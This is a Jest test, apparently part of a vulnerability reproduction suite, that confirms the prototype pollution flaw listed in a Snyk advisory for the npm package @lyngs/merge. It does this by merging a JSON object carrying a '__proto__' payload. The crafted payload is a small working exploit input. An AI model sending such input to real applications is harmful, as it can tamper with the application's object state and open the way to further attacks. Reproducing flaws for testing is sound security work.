//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
test("prototype pollution in @lyngs/merge", () => {
  const { merge } = require("@lyngs/merge");
  expect({}.polluted).toBe(undefined);
  merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
  expect({}.polluted).toBe("yes");
});
